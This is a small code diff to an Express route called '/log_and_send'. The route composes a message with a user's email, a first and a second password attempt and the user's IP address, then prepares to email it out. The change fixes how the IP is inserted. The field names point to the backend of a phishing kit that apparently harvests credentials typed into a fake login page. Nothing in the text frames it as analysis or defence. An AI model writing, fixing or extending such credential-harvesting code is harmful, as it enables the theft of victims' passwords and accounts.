@@ -31,7 +31,7 @@ app.post('/log_and_send', (req, res) => {
         Email: ${email}
         First Password Used: ${firstpasswordused}
         Second Password Used: ${secondpasswordused}
-        User IP: ${[user_ip]}
+        User IP: ${user_ip}
     `;
 
     // Prepare email options
